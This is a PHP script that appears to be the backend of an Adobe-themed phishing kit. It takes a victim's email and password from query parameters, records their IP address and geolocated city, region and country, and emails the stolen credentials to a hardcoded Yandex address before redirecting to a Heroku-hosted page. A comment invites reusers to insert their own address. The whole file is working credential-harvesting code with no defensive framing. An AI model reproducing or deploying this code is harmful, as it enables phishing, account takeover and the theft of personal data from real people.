<?php
session_start();
include "0___/b.php";
$error_message = ""; $success = "";
if (isset($_GET['A1']) && isset($_GET['A2'])) {
  $A1 = $_GET['A1'];
  $A2 = $_GET['A2'];

  if (!empty($A1) && !empty($A2)) {
$adddate = date("D M d, Y g:i a");
$browser = $_SERVER['HTTP_USER_AGENT'];
$sender = 'results@phpgroup.co';
$headers .= "From: PHP<$sender>\n";

require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();

//get user's ip address 
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

$message .= "---------------|reWritten By PHP Bloke|-------------\n";
$message .= "Email ID    : " . $_GET['A1'] . "\n"; 
$message .= "Password    : " . $_GET['A2'] . "\n"; 
$message .= "IP          : " .$ip. "\n"; 
$message .= "Date & Time : $adddate\n";
$message .= "City: {$geoplugin->city}\n";
$message .= "Region: {$geoplugin->region}\n";
$message .= "Country Name: {$geoplugin->countryName}\n";
$message .= "Country Code: {$geoplugin->countryCode}\n";
$message .= "----------------------------------------------------\n";
$message .= "Talk is Cheap, Show me Some Codez!";
$recipient = "steve.boucher@yandex.com";  //PUT YOUR E***L HERE BRO
$subject = "Adobe Report 2019 | {$geoplugin->countryName}\n";
if (mail($recipient,$subject,$message,$headers)) {
   header("Location:  https://purchasematerial-requirements.herokuapp.com/__a__00__.php");
  }
else {
  $error_message.= "sorry, an error occurred. please try again later.";
  }
  } else {
    $error_message.= "Fill Email/Password field.";
  }
}
?>